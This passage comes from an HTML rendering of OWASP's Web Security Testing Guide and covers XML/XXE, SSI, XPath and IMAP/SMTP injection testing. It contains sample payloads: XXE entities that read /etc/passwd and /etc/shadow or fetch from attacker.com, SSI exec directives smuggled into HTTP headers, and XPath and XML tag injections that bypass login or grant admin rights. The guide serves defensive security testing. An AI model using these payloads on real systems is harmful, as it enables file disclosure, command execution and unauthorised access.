                        <span class="cp">&lt;!ENTITY xxe SYSTEM "file:///dev/random" &gt;</span>]&gt;
                        <span class="nt">&lt;foo&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/foo&gt;</span>
                </code></pre></div></div>
                
                <p>This test could crash the web server (on a UNIX system), if the XML parser attempts to substitute the entity with the contents of the /dev/random file.</p>
                
                <p>Other useful tests are the following:</p>
                
                <div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</span>
                    <span class="cp">&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;</span>
                        <span class="cp">&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;</span>]&gt;<span class="nt">&lt;foo&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/foo&gt;</span>
                
                <span class="cp">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</span>
                    <span class="cp">&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;</span>
                        <span class="cp">&lt;!ENTITY xxe SYSTEM "file:///etc/shadow" &gt;</span>]&gt;<span class="nt">&lt;foo&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/foo&gt;</span>
                
                <span class="cp">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</span>
                    <span class="cp">&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;</span>
                        <span class="cp">&lt;!ENTITY xxe SYSTEM "file:///c:/boot.ini" &gt;</span>]&gt;<span class="nt">&lt;foo&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/foo&gt;</span>
                
                <span class="cp">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</span>
                    <span class="cp">&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;</span>
                        <span class="cp">&lt;!ENTITY xxe SYSTEM "http://www.attacker.com/text.txt" &gt;</span>]&gt;<span class="nt">&lt;foo&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/foo&gt;</span>
                </code></pre></div></div>
                
                <h3 id="tag-injection">Tag Injection</h3>
                
                <p>Once the first step is accomplished, the tester will have some information about the structure of the XML document. Then, it is possible to try to inject XML data and tags. We will show an example of how this can lead to a privilege escalation attack.</p>
                
                <p>Let’s considering the previous application. By inserting the following values:</p>
                
                <pre><code class="language-txt">Username: tony
                Password: Un6R34kb!e
                E-mail: s4tan@hell.com&lt;/mail&gt;&lt;userid&gt;0&lt;/userid&gt;&lt;mail&gt;s4tan@hell.com
                </code></pre>
                
                <p>the application will build a new node and append it to the XML database:</p>
                
                <div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</span>
                <span class="nt">&lt;users&gt;</span>
                    <span class="nt">&lt;user&gt;</span>
                        <span class="nt">&lt;username&gt;</span>gandalf<span class="nt">&lt;/username&gt;</span>
                        <span class="nt">&lt;password&gt;</span>!c3<span class="nt">&lt;/password&gt;</span>
                        <span class="nt">&lt;userid&gt;</span>0<span class="nt">&lt;/userid&gt;</span>
                        <span class="nt">&lt;mail&gt;</span>gandalf@middleearth.com<span class="nt">&lt;/mail&gt;</span>
                    <span class="nt">&lt;/user&gt;</span>
                    <span class="nt">&lt;user&gt;</span>
                        <span class="nt">&lt;username&gt;</span>Stefan0<span class="nt">&lt;/username&gt;</span>
                        <span class="nt">&lt;password&gt;</span>w1s3c<span class="nt">&lt;/password&gt;</span>
                        <span class="nt">&lt;userid&gt;</span>500<span class="nt">&lt;/userid&gt;</span>
                        <span class="nt">&lt;mail&gt;</span>Stefan0@whysec.hmm<span class="nt">&lt;/mail&gt;</span>
                    <span class="nt">&lt;/user&gt;</span>
                    <span class="nt">&lt;user&gt;</span>
                        <span class="nt">&lt;username&gt;</span>tony<span class="nt">&lt;/username&gt;</span>
                        <span class="nt">&lt;password&gt;</span>Un6R34kb!e<span class="nt">&lt;/password&gt;</span>
                        <span class="nt">&lt;userid&gt;</span>500<span class="nt">&lt;/userid&gt;</span>
                        <span class="nt">&lt;mail&gt;</span>s4tan@hell.com<span class="nt">&lt;/mail&gt;</span>
                        <span class="nt">&lt;userid&gt;</span>0<span class="nt">&lt;/userid&gt;</span>
                        <span class="nt">&lt;mail&gt;</span>s4tan@hell.com<span class="nt">&lt;/mail&gt;</span>
                    <span class="nt">&lt;/user&gt;</span>
                <span class="nt">&lt;/users&gt;</span>
                </code></pre></div></div>
                
                <p>The resulting XML file is well formed. Furthermore, it is likely that, for the user tony, the value associated with the userid tag is the one appearing last, i.e., 0 (the admin ID). In other words, we have injected a user with administrative privileges.</p>
                
                <p>The only problem is that the userid tag appears twice in the last user node. Often, XML documents are associated with a schema or a DTD and will be rejected if they don’t comply with it.</p>
                
                <p>Let’s suppose that the XML document is specified by the following DTD:</p>
                
                <div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE users [
                    &lt;!ELEMENT users (user+) &gt;</span>
                    <span class="cp">&lt;!ELEMENT user (username,password,userid,mail+) &gt;</span>
                    <span class="cp">&lt;!ELEMENT username (#PCDATA) &gt;</span>
                    <span class="cp">&lt;!ELEMENT password (#PCDATA) &gt;</span>
                    <span class="cp">&lt;!ELEMENT userid (#PCDATA) &gt;</span>
                    <span class="cp">&lt;!ELEMENT mail (#PCDATA) &gt;</span>
                ]&gt;
                </code></pre></div></div>
                
                <p>Note that the userid node is defined with cardinality 1. In this case, the attack we have shown before (and other simple attacks) will not work, if the XML document is validated against its DTD before any processing occurs.</p>
                
                <p>However, this problem can be solved, if the tester controls the value of some nodes preceding the offending node (userid, in this example). In fact, the tester can comment out such node, by injecting a comment start/end sequence:</p>
                
                <pre><code class="language-txt">Username: tony
                Password: Un6R34kb!e&lt;/password&gt;&lt;!--
                E-mail: --&gt;&lt;userid&gt;0&lt;/userid&gt;&lt;mail&gt;s4tan@hell.com
                </code></pre>
                
                <p>In this case, the final XML database is:</p>
                
                <div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</span>
                <span class="nt">&lt;users&gt;</span>
                    <span class="nt">&lt;user&gt;</span>
                        <span class="nt">&lt;username&gt;</span>gandalf<span class="nt">&lt;/username&gt;</span>
                        <span class="nt">&lt;password&gt;</span>!c3<span class="nt">&lt;/password&gt;</span>
                        <span class="nt">&lt;userid&gt;</span>0<span class="nt">&lt;/userid&gt;</span>
                        <span class="nt">&lt;mail&gt;</span>gandalf@middleearth.com<span class="nt">&lt;/mail&gt;</span>
                    <span class="nt">&lt;/user&gt;</span>
                    <span class="nt">&lt;user&gt;</span>
                        <span class="nt">&lt;username&gt;</span>Stefan0<span class="nt">&lt;/username&gt;</span>
                        <span class="nt">&lt;password&gt;</span>w1s3c<span class="nt">&lt;/password&gt;</span>
                        <span class="nt">&lt;userid&gt;</span>500<span class="nt">&lt;/userid&gt;</span>
                        <span class="nt">&lt;mail&gt;</span>Stefan0@whysec.hmm<span class="nt">&lt;/mail&gt;</span>
                    <span class="nt">&lt;/user&gt;</span>
                    <span class="nt">&lt;user&gt;</span>
                        <span class="nt">&lt;username&gt;</span>tony<span class="nt">&lt;/username&gt;</span>
                        <span class="nt">&lt;password&gt;</span>Un6R34kb!e<span class="nt">&lt;/password&gt;</span><span class="c">&lt;!--&lt;/password&gt;
                        &lt;userid&gt;500&lt;/userid&gt;
                        &lt;mail&gt;--&gt;</span><span class="nt">&lt;userid&gt;</span>0<span class="nt">&lt;/userid&gt;&lt;mail&gt;</span>s4tan@hell.com<span class="nt">&lt;/mail&gt;</span>
                    <span class="nt">&lt;/user&gt;</span>
                <span class="nt">&lt;/users&gt;</span>
                </code></pre></div></div>
                
                <p>The original <code class="language-plaintext highlighter-rouge">userid</code> node has been commented out, leaving only the injected one. The document now complies with its DTD rules.</p>
                
                <h2 id="source-code-review">Source Code Review</h2>
                
                <p>The following Java API may be vulnerable to XXE if they are not configured properly.</p>
                
                <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>javax.xml.parsers.DocumentBuilder
                javax.xml.parsers.DocumentBuildFactory
                org.xml.sax.EntityResolver
                org.dom4j.*
                javax.xml.parsers.SAXParser
                javax.xml.parsers.SAXParserFactory
                TransformerFactory
                SAXReader
                DocumentHelper
                SAXBuilder
                SAXParserFactory
                XMLReaderFactory
                XMLInputFactory
                SchemaFactory
                DocumentBuilderFactoryImpl
                SAXTransformerFactory
                DocumentBuilderFactoryImpl
                XMLReader
                Xerces: DOMParser, DOMParserImpl, SAXParser, XMLParser
                </code></pre></div></div>
                
                <p>Check source code if the docType, external DTD, and external parameter entities are set as forbidden uses.</p>
                
                <ul>
                  <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html">XML External Entity (XXE) Prevention Cheat Sheet</a></li>
                </ul>
                
                <p>In addition, the Java POI office reader may be vulnerable to XXE if the version is under 3.10.1.</p>
                
                <p>The version of POI library can be identified from the filename of the JAR. For example,</p>
                
                <ul>
                  <li><code class="language-plaintext highlighter-rouge">poi-3.8.jar</code></li>
                  <li><code class="language-plaintext highlighter-rouge">poi-ooxml-3.8.jar</code></li>
                </ul>
                
                <p>The followings source code keyword may apply to C.</p>
                
                <ul>
                  <li>libxml2: xmlCtxtReadMemory,xmlCtxtUseOptions,xmlParseInNodeContext,xmlReadDoc,xmlReadFd,xmlReadFile ,xmlReadIO,xmlReadMemory, xmlCtxtReadDoc ,xmlCtxtReadFd,xmlCtxtReadFile,xmlCtxtReadIO</li>
                  <li>libxerces-c: XercesDOMParser, SAXParser, SAX2XMLReader</li>
                </ul>
                
                <h2 id="tools">Tools</h2>
                
                <ul>
                  <li><a href="https://github.com/xmendez/wfuzz/blob/master/wordlist/Injections/XML.txt">XML Injection Fuzz Strings (from wfuzz tool)</a></li>
                </ul>
                
                <h2 id="references">References</h2>
                
                <ul>
                  <li><a href="https://www.whitehatsec.com/glossary/content/xml-injection">XML Injection</a></li>
                  <li><a href="https://www.securityfocus.com/archive/1/297714">Gregory Steuck, “XXE (Xml eXternal Entity) attack”</a></li>
                  <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html">OWASP XXE Prevention Cheat Sheet</a></li>
                </ul>
            </div>
            <div class="modal-footer">
                <a href="https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection" class="btn btn-success" target="_blank">View on owasp.org</a>
                <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
            </div>
        </div>
    </div>
</div>

<!-- Modal -->
<div class="modal fade" id="inpv8Modal" tabindex="-1" role="dialog" aria-labelledby="inpv8ModalLabel" aria-hidden="true">
    <div class="modal-dialog modal-xl" role="document">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title" id="inpv8ModalLabel">WSTG-INPV-08 - Testing for SSI Injection</h5>
                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                </button>
            </div>
            <div class="modal-body">
                <h2 id="summary">Summary</h2>
                
                <p>Web servers usually give developers the ability to add small pieces of dynamic code inside static HTML pages, without having to deal with full-fledged server-side or client-side languages. This feature is provided by <a href="https://owasp.org/www-community/attacks/Server-Side_Includes_%28SSI%29_Injection">Server-Side Includes</a>(SSI).</p>
                
                <p>Server-Side Includes are directives that the web server parses before serving the page to the user. They represent an alternative to writing CGI programs or embedding code using server-side scripting languages, when there’s only need to perform very simple tasks. Common SSI implementations provide directives (commands) to include external files, to set and print web server CGI environment variables, or to execute external CGI scripts or system commands.</p>
                
                <p>SSI can lead to a Remote Command Execution (RCE), however most webservers have the <code class="language-plaintext highlighter-rouge">exec</code> directive disabled by default.</p>
                
                <p>This is a vulnerability very similar to a classical scripting language injection vulnerability. One mitigation is that the web server needs to be configured to allow SSI. On the other hand, SSI injection vulnerabilities are often simpler to exploit, since SSI directives are easy to understand and, at the same time, quite powerful, e.g., they can output the content of files and execute system commands.</p>
                
                <h2 id="test-objectives">Test Objectives</h2>
                
                <ul>
                  <li>Identify SSI injection points.</li>
                  <li>Assess the severity of the injection.</li>
                </ul>
                
                <h2 id="how-to-test">How to Test</h2>
                
                <p>To test for exploitable SSI, inject SSI directives as user input. If SSI are enabled and user input validation has not been properly implemented, the server will execute the directive. This is very similar to a classical scripting language injection vulnerability in that it occurs when user input is not properly validated and sanitized.</p>
                
                <p>First determine if the web server supports SSI directives. Often, the answer is yes, as SSI support is quite common. To determine if SSI directives are supported, discover the type of web server that the target is running using information gathering techniques (see <a href="/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server">Fingerprint Web Server</a>). If you have access to the code, determine if SSI directives are used by searching through the webserver configuration files for specific keywords.</p>
                
                <p>Another way of verifying that SSI directives are enabled is by checking for pages with the <code class="language-plaintext highlighter-rouge">.shtml</code> extension, which is associated with SSI directives. The use of the <code class="language-plaintext highlighter-rouge">.shtml</code> extension is not mandatory, so not having found any <code class="language-plaintext highlighter-rouge">.shtml</code> files doesn’t necessarily mean that the target is not vulnerable to SSI injection attacks.</p>
                
                <p>The next step is determining all the possible user input vectors and testing to see if the SSI injection is exploitable.</p>
                
                <p>First find all the pages where user input is allowed. Possible input vectors may also include headers and cookies. Determine how the input is stored and used, i.e if the input is returned as an error message or page element and if it was modified in some way. Access to the source code can help you to more easily determine where the input vectors are and how input is handled.</p>
                
                <p>Once you have a list of potential injection points, you may determine if the input is correctly validated. Ensure it is possible to inject characters used in SSI directives such as <code class="language-plaintext highlighter-rouge">&lt;!#=/."-&gt;</code> and <code class="language-plaintext highlighter-rouge">[a-zA-Z0-9]</code></p>
                
                <p>The below example returns the value of the variable. The <a href="#references">references</a> section has helpful links with server-specific documentation to help you better assess a particular system.</p>
                
                <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!--#echo var="VAR" --&gt;</span>
                </code></pre></div></div>
                
                <p>When using the <code class="language-plaintext highlighter-rouge">include</code> directive, if the supplied file is a CGI script, this directive will include the output of the CGI script. This directive may also be used to include the content of a file or list files in a directory:</p>
                
                <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!--#include virtual="FILENAME" --&gt;</span>
                </code></pre></div></div>
                
                <p>To return the output of a system command:</p>
                
                <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!--#exec cmd="OS_COMMAND" --&gt;</span>
                </code></pre></div></div>
                
                <p>If the application is vulnerable, the directive is injected and it would be interpreted by the server the next time the page is served.</p>
                
                <p>The SSI directives can also be injected in the HTTP headers, if the web application is using that data to build a dynamically generated page:</p>
                
                <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET / HTTP/1.1
                Host: www.example.com
                Referer: &lt;!--#exec cmd="/bin/ps ax"--&gt;
                User-Agent: &lt;!--#include virtual="/proc/version"--&gt;
                </code></pre></div></div>
                
                <h2 id="tools">Tools</h2>
                
                <ul>
                  <li><a href="https://portswigger.net/burp/communitydownload">Web Proxy Burp Suite</a></li>
                  <li><a href="https://www.zaproxy.org/">OWASP ZAP</a></li>
                  <li><a href="https://www.gnu.org/software/grep">String searcher: grep</a></li>
                </ul>
                
                <h2 id="references">References</h2>
                
                <ul>
                  <li><a href="http://nginx.org/en/docs/http/ngx_http_ssi_module.html">Nginx SSI module</a></li>
                  <li><a href="https://httpd.apache.org/docs/current/mod/mod_include.html">Apache: Module mod_include</a></li>
                  <li><a href="https://docs.microsoft.com/en-us/previous-versions/iis/6.0-sdk/ms525185%28v=vs.90%29">IIS: Server Side Includes directives</a></li>
                  <li><a href="https://httpd.apache.org/docs/current/howto/ssi.html">Apache Tutorial: Introduction to Server Side Includes</a></li>
                  <li><a href="https://httpd.apache.org/docs/current/misc/security_tips.html#ssi">Apache: Security Tips for Server Configuration</a></li>
                  <li><a href="https://jeremiahgrossman.blogspot.com/2006/08/ssi-injection-instead-of-javascript.html">SSI Injection instead of JavaScript Malware</a></li>
                  <li><a href="https://blogs.iis.net/robert_mcmurray/archive/2010/12/28/iis-notes-on-server-side-includes-ssi-syntax-kb-203064-revisited.aspx">IIS: Notes on Server-Side Includes (SSI) syntax</a></li>
                  <li><a href="https://www.cgisecurity.com/papers/header-based-exploitation.txt">Header Based Exploitation</a></li>
                </ul>

            </div>
            <div class="modal-footer">
                <a href="https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/08-Testing_for_SSI_Injection" class="btn btn-success" target="_blank">View on owasp.org</a>
                <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
            </div>
        </div>
    </div>
</div>

<!-- Modal -->
<div class="modal fade" id="inpv9Modal" tabindex="-1" role="dialog" aria-labelledby="inpv9ModalLabel" aria-hidden="true">
    <div class="modal-dialog modal-xl" role="document">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title" id="inpv9ModalLabel">WSTG-INPV-09 - Testing for XPath Injection</h5>
                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                </button>
            </div>
            <div class="modal-body">
                <h2 id="summary">Summary</h2>
                
                <p>XPath is a language that has been designed and developed primarily to address parts of an XML document. In XPath injection testing, we test if it is possible to inject XPath syntax into a request interpreted by the application, allowing an attacker to execute user-controlled XPath queries. When successfully exploited, this vulnerability may allow an attacker to bypass authentication mechanisms or access information without proper authorization.</p>
                
                <p>Web applications heavily use databases to store and access the data they need for their operations. Historically, relational databases have been by far the most common technology for data storage, but, in the last years, we are witnessing an increasing popularity for databases that organize data using the XML language. Just like relational databases are accessed via SQL language, XML databases use XPath as their standard query language.</p>
                
                <p>Since, from a conceptual point of view, XPath is very similar to SQL in its purpose and applications, an interesting result is that XPath injection attacks follow the same logic as <a href="https://owasp.org/www-community/attacks/SQL_Injection">SQL Injection</a> attacks. In some aspects, XPath is even more powerful than standard SQL, as its whole power is already present in its specifications, whereas a large number of the techniques that can be used in a SQL Injection attack depend on the characteristics of the SQL dialect used by the target database. This means that XPath injection attacks can be much more adaptable and ubiquitous. Another advantage of an XPath injection attack is that, unlike SQL, no ACLs are enforced, as our query can access every part of the XML document.</p>
                
                <h2 id="test-objectives">Test Objectives</h2>
                
                <ul>
                  <li>Identify XPATH injection points.</li>
                </ul>
                
                <h2 id="how-to-test">How to Test</h2>
                
                <p>The <a href="http://dl.packetstormsecurity.net/papers/bypass/Blind_XPath_Injection_20040518.pdf">XPath attack pattern was first published by Amit Klein</a> and is very similar to the usual SQL Injection. In order to get a first grasp of the problem, let’s imagine a login page that manages the authentication to an application in which the user must enter their username and password. Let’s assume that our database is represented by the following XML file:</p>
                
                <div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</span>
                <span class="nt">&lt;users&gt;</span>
                    <span class="nt">&lt;user&gt;</span>
                        <span class="nt">&lt;username&gt;</span>gandalf<span class="nt">&lt;/username&gt;</span>
                        <span class="nt">&lt;password&gt;</span>!c3<span class="nt">&lt;/password&gt;</span>
                        <span class="nt">&lt;account&gt;</span>admin<span class="nt">&lt;/account&gt;</span>
                    <span class="nt">&lt;/user&gt;</span>
                    <span class="nt">&lt;user&gt;</span>
                        <span class="nt">&lt;username&gt;</span>Stefan0<span class="nt">&lt;/username&gt;</span>
                        <span class="nt">&lt;password&gt;</span>w1s3c<span class="nt">&lt;/password&gt;</span>
                        <span class="nt">&lt;account&gt;</span>guest<span class="nt">&lt;/account&gt;</span>
                    <span class="nt">&lt;/user&gt;</span>
                    <span class="nt">&lt;user&gt;</span>
                        <span class="nt">&lt;username&gt;</span>tony<span class="nt">&lt;/username&gt;</span>
                        <span class="nt">&lt;password&gt;</span>Un6R34kb!e<span class="nt">&lt;/password&gt;</span>
                        <span class="nt">&lt;account&gt;</span>guest<span class="nt">&lt;/account&gt;</span>
                    <span class="nt">&lt;/user&gt;</span>
                <span class="nt">&lt;/users&gt;</span>
                </code></pre></div></div>
                
                <p>An XPath query that returns the account whose username is <code class="language-plaintext highlighter-rouge">gandalf</code> and the password is <code class="language-plaintext highlighter-rouge">!c3</code> would be the following:</p>
                
                <p><code class="language-plaintext highlighter-rouge">string(//user[username/text()='gandalf' and password/text()='!c3']/account/text())</code></p>
                
                <p>If the application does not properly filter user input, the tester will be able to inject XPath code and interfere with the query result. For instance, the tester could input the following values:</p>
                
                <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Username: ' or '1' = '1
                Password: ' or '1' = '1
                </code></pre></div></div>
                
                <p>Looks quite familiar, doesn’t it? Using these parameters, the query becomes:</p>
                
                <p><code class="language-plaintext highlighter-rouge">string(//user[username/text()='' or '1' = '1' and password/text()='' or '1' = '1']/account/text())</code></p>
                
                <p>As in a common SQL Injection attack, we have created a query that always evaluates to true, which means that the application will authenticate the user even if a username or a password have not been provided. And as in a common SQL Injection attack, with XPath injection, the first step is to insert a single quote (<code class="language-plaintext highlighter-rouge">'</code>) in the field to be tested, introducing a syntax error in the query, and to check whether the application returns an error message.</p>
                
                <p>If there is no knowledge about the XML data internal details and if the application does not provide useful error messages that help us reconstruct its internal logic, it is possible to perform a <a href="https://owasp.org/www-community/attacks/Blind_XPath_Injection">Blind XPath Injection</a> attack, whose goal is to reconstruct the whole data structure. The technique is similar to inference based SQL Injection, as the approach is to inject code that creates a query that returns one bit of information. <a href="https://owasp.org/www-community/attacks/Blind_XPath_Injection">Blind XPath Injection</a> is explained in more detail by Amit Klein in the referenced paper.</p>
                
                <h2 id="references">References</h2>
                
                <h3 id="whitepapers">Whitepapers</h3>
                
                <ul>
                  <li><a href="http://dl.packetstormsecurity.net/papers/bypass/Blind_XPath_Injection_20040518.pdf">Amit Klein: “Blind XPath Injection”</a></li>
                  <li><a href="https://www.w3.org/TR/1999/REC-xpath-19991116/">XPath 1.0 specifications</a></li>
                </ul>
            </div>
            <div class="modal-footer">
                <a href="https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/09-Testing_for_XPath_Injection" class="btn btn-success" target="_blank">View on owasp.org</a>
                <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
            </div>
        </div>
    </div>
</div>

<!-- Modal -->
<div class="modal fade" id="inpv10Modal" tabindex="-1" role="dialog" aria-labelledby="inpv10ModalLabel" aria-hidden="true">
    <div class="modal-dialog modal-xl" role="document">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title" id="inpv10ModalLabel">WSTG-INPV-10 - Testing for IMAP SMTP Injection</h5>
                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                </button>
            </div>
            <div class="modal-body">
                <h2 id="summary">Summary</h2>
                
                <p>This threat affects all applications that communicate with mail servers (IMAP/SMTP), generally webmail applications. The aim of this test is to verify the capacity to inject arbitrary IMAP/SMTP commands into the mail servers, due to input data not being properly sanitized.</p>
                
                <p>The IMAP/SMTP Injection technique is more effective if the mail server is not directly accessible from Internet. Where full communication with the backend mail server is possible, it is recommended to conduct direct testing.</p>
                
                <p>An IMAP/SMTP Injection makes it possible to access a mail server which otherwise would not be directly accessible from the Internet. In some cases, these internal systems do not have the same level of infrastructure security and hardening that is applied to the front-end web servers. Therefore, mail server results may be more vulnerable to attacks by end users (see the scheme presented in Figure 1).</p>

                
                <p>Figure 1 depicts the flow of traffic generally seen when using webmail technologies. Step 1 and 2 is the user interacting with the webmail client, whereas step 2 is the tester bypassing the webmail client and interacting with the back-end mail servers directly.</p>
                
                <p>This technique allows a wide variety of actions and attacks. The possibilities depend on the type and scope of injection and the mail server technology being tested.</p>
                
                <p>Some examples of attacks using the IMAP/SMTP Injection technique are:</p>
                
                <ul>
                  <li>Exploitation of vulnerabilities in the IMAP/SMTP protocol</li>
                  <li>Application restrictions evasion</li>
                  <li>Anti-automation process evasion</li>
                  <li>Information leaks</li>
                  <li>Relay/SPAM</li>
                </ul>
                
                <h2 id="test-objectives">Test Objectives</h2>
                
                <ul>
                  <li>Identify IMAP/SMTP injection points.</li>
                  <li>Understand the data flow and deployment structure of the system.</li>
                  <li>Assess the injection impacts.</li>
                </ul>
                
                <h2 id="how-to-test">How to Test</h2>
                
                <h3 id="identifying-vulnerable-parameters">Identifying Vulnerable Parameters</h3>
                
                <p>In order to detect vulnerable parameters, the tester has to analyze the application’s ability in handling input. Input validation testing requires the tester to send bogus, or malicious, requests to the server and analyse the response. In a secure application, the response should be an error with some corresponding action telling the client that something has gone wrong. In a vulnerable application, the malicious request may be processed by the back-end application that will answer with a <code class="language-plaintext highlighter-rouge">HTTP 200 OK</code> response message.</p>
                
                <p>It is important to note that the requests being sent should match the technology being tested. Sending SQL injection strings for Microsoft SQL server when a MySQL server is being used will result in false positive responses. In this case, sending malicious IMAP commands is modus operandi since IMAP is the underlying protocol being tested.</p>
                
                <p>IMAP special parameters that should be used are:</p>
                
                <table>
                  <thead>
                    <tr>
                      <th>On the IMAP server</th>
                      <th>On the SMTP server</th>
                    </tr>
                  </thead>
                  <tbody>
                    <tr>
                      <td>Authentication</td>
                      <td>Emissor email</td>
                    </tr>
                    <tr>
                      <td>operations with mail boxes (list, read, create, delete, rename)</td>
                      <td>Destination email</td>
                    </tr>
                    <tr>
                      <td>operations with messages (read, copy, move, delete)</td>
                      <td>Subject</td>
                    </tr>
                    <tr>
                      <td>Disconnection</td>
                      <td>Message body</td>
                    </tr>
                    <tr>
                      <td>&nbsp;</td>
                      <td>Attached files</td>
                    </tr>
                  </tbody>
                </table>
                
                <p>In this example, the “mailbox” parameter is being tested by manipulating all requests with the parameter in:</p>
                
                <p><code class="language-plaintext highlighter-rouge">http://&lt;webmail&gt;/src/read_body.php?mailbox=INBOX&amp;passed_id=46106&amp;startMessage=1</code></p>
                
                <p>The following examples can be used.</p>
                
                <ul>
                  <li>Assign a null value to the parameter:</li>
                </ul>
                
                <p><code class="language-plaintext highlighter-rouge">http://&lt;webmail&gt;/src/read_body.php?mailbox=&amp;passed_id=46106&amp;startMessage=1</code></p>
                
                <ul>
                  <li>Substitute the value with a random value:</li>
                </ul>
                
                <p><code class="language-plaintext highlighter-rouge">http://&lt;webmail&gt;/src/read_body.php?mailbox=NOTEXIST&amp;passed_id=46106&amp;startMessage=1</code></p>
                
                <ul>
                  <li>Add other values to the parameter:</li>
                </ul>
                
                <p><code class="language-plaintext highlighter-rouge">http://&lt;webmail&gt;/src/read_body.php?mailbox=INBOX PARAMETER2&amp;passed_id=46106&amp;startMessage=1</code></p>
                
                <ul>
                  <li>Add non standard special characters (i.e.: <code class="language-plaintext highlighter-rouge">\</code>, <code class="language-plaintext highlighter-rouge">'</code>, <code class="language-plaintext highlighter-rouge">"</code>, <code class="language-plaintext highlighter-rouge"></code>, <code class="language-plaintext highlighter-rouge">#</code>, <code class="language-plaintext highlighter-rouge">!</code>, <code class="language-plaintext highlighter-rouge">|</code>):</li>
                </ul>
                
                <p><code class="language-plaintext highlighter-rouge">http://&lt;webmail&gt;/src/read_body.php?mailbox=INBOX"&amp;passed_id=46106&amp;startMessage=1</code></p>
                
                <ul>
                  <li>Eliminate the parameter:</li>
                </ul>
                
                <p><code class="language-plaintext highlighter-rouge">http://&lt;webmail&gt;/src/read_body.php?passed_id=46106&amp;startMessage=1</code></p>
                
                <p>The final result of the above testing gives the tester three possible situations:
                S1 - The application returns a error code/message
                S2 - The application does not return an error code/message, but it does not realize the requested operation
                S3 - The application does not return an error code/message and realizes the operation requested normally</p>
                
                <p>Situations S1 and S2 represent successful IMAP/SMTP injection.</p>
                
                <p>An attacker’s aim is receiving the S1 response, as it is an indicator that the application is vulnerable to injection and further manipulation.</p>
                
                <p>Let’s suppose that a user retrieves the email headers using the following HTTP request:</p>
                
                <p><code class="language-plaintext highlighter-rouge">http://&lt;webmail&gt;/src/view_header.php?mailbox=INBOX&amp;passed_id=46105&amp;passed_ent_id=0</code></p>
                
                <p>An attacker might modify the value of the parameter INBOX by injecting the character <code class="language-plaintext highlighter-rouge">"</code> (%22 using URL encoding):</p>
                
                <p><code class="language-plaintext highlighter-rouge">http://&lt;webmail&gt;/src/view_header.php?mailbox=INBOX%22&amp;passed_id=46105&amp;passed_ent_id=0</code></p>
                
                <p>In this case, the application answer may be:</p>
                
                <pre><code class="language-txt">ERROR: Bad or malformed request.
                Query: SELECT "INBOX""
                Server responded: Unexpected extra arguments to Select
                </code></pre>
                
                <p>The situation S2 is harder to test successfully. The tester needs to use blind command injection in order to determine if the server is vulnerable.</p>
                
                <p>On the other hand, the last situation (S3) is not revelant in this paragraph.</p>
                
                <blockquote>
                  <p>List of vulnerable parameters</p>
                
                  <ul>
                    <li>Affected functionality</li>
                    <li>Type of possible injection (IMAP/SMTP)</li>
                  </ul>
                </blockquote>
                
                <h3 id="understanding-the-data-flow-and-deployment-structure-of-the-client">Understanding the Data Flow and Deployment Structure of the Client</h3>
                
                <p>After identifying all vulnerable parameters (for example, <code class="language-plaintext highlighter-rouge">passed_id</code>), the tester needs to determine what level of injection is possible and then design a testing plan to further exploit the application.</p>
                
                <p>In this test case, we have detected that the application’s <code class="language-plaintext highlighter-rouge">passed_id</code> parameter is vulnerable and is used in the following request:</p>
                
                <p><code class="language-plaintext highlighter-rouge">http://&lt;webmail&gt;/src/read_body.php?mailbox=INBOX&amp;passed_id=46225&amp;startMessage=1</code></p>
                
                <p>Using the following test case (providing an alphabetical value when a numerical value is required):</p>
                
